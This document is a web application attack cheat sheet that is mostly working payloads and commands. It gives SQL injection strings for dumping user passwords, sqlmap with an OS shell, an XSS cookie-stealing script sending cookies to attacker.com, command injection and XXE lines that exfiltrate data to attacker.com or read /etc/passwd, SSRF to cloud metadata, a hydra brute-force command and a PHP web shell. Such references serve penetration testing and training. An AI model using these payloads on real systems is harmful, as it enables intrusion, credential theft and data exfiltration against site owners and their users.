# Web Application Attack Techniques

## Information Gathering

### Technology Detection
```bash
# Wappalyzer, WhatWeb
whatweb target.com

# HTTP headers
curl -I target.com

# robots.txt, sitemap.xml
curl target.com/robots.txt
curl target.com/sitemap.xml
```

### Directory Discovery
```bash
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt
dirsearch -u http://target.com
```

---

## Injection Attacks

### SQL Injection

#### Detection
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
1' AND '1'='1
1' AND '1'='2
```

#### Union-Based
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
```

#### Error-Based
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
```

#### Blind Boolean
```sql
' AND 1=1--  (true)
' AND 1=2--  (false)
' AND SUBSTRING(username,1,1)='a'--
```

#### Blind Time-Based
```sql
'; WAITFOR DELAY '0:0:5'--     (MSSQL)
'; SELECT SLEEP(5)--           (MySQL)
'; SELECT pg_sleep(5)--        (PostgreSQL)
```

#### SQLMap
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

### Cross-Site Scripting (XSS)

#### Reflected XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
```

#### Stored XSS
Same payloads, submitted to stored fields (comments, profiles).

#### DOM XSS
```javascript
// Vulnerable sink
document.write(location.hash)
innerHTML = userInput
eval(userInput)
```

#### Filter Bypass
```html
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

#### Cookie Stealing
```html
<script>new Image().src="http://attacker.com/?c="+document.cookie</script>
```

---

### Command Injection

#### Basic
```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
```

#### Blind
```bash
; sleep 5
; ping -c 5 attacker.com
; curl http://attacker.com/$(whoami)
```

---

### XML External Entity (XXE)

#### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### Blind XXE (Out-of-Band)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=test">]>
```

#### XXE to SSRF
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>
```

---

### Server-Side Request Forgery (SSRF)

#### Basic
```
http://localhost/admin
http://127.0.0.1/admin
http://[::1]/admin
http://169.254.169.254/latest/meta-data/  (AWS)
```

#### Bypass Filters
```
http://127.1/
http://0/
http://localhost.localdomain/
http://2130706433/ (decimal IP)
http://0x7f000001/ (hex IP)
```

---

## Authentication Attacks

### Brute Force
```bash
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

### Credential Stuffing
Using breached credentials from other sites.

### Default Credentials
Check vendor documentation, SecLists.

### Session Attacks
- Session fixation
- Session hijacking
- Insecure session storage

---

## Authorization Attacks

### Insecure Direct Object Reference (IDOR)
```
/api/user/1 → /api/user/2
/download?file=report1.pdf → /download?file=../../../etc/passwd
```

### Privilege Escalation
```
Change role parameter: role=admin
Modify user ID in request
Access admin endpoints as regular user
```

---

## File Upload Attacks

### Bypass Extensions
```
shell.php.jpg
shell.php%00.jpg
shell.pHp
shell.php5
shell.phtml
```

### Bypass Content-Type
```
Change Content-Type: image/jpeg
Add GIF89a header
```

### Web Shells
```php
<?php system($_GET['cmd']); ?>
```

---

## Deserialization

### Java
- Use ysoserial to generate payloads
- Look for `ObjectInputStream.readObject()`

### PHP
- Use PHPGGC for gadget chains
- Look for `unserialize()`

### Python
- Look for `pickle.loads()`

---

## Template Injection (SSTI)

### Detection
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

### Jinja2 (Python)
```python
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## Tools Summary
- **Burp Suite**: Web proxy, scanner
- **OWASP ZAP**: Free alternative
- **SQLMap**: SQL injection automation
- **XSSer**: XSS detection
- **Nikto**: Web server scanner
- **wfuzz**: Web fuzzer
